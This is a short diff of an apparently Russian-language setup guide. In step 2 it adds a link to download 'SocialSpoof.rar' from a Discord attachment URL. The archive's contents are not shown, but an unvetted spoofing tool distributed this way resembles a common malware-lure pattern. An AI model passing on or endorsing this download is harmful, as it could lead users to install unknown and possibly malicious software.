@@ -17,7 +17,7 @@
 
 Шаг 2 📥
 
-Как только выполнили расширение, загрузите SocialSpoof
+Как только выполнили расширение, загрузите [Social Spoof](https://cdn.discordapp.com/attachments/1153709870365806742/1154026506331377754/SocialSpoof.rar)
 
 Шаг 3 📂
 
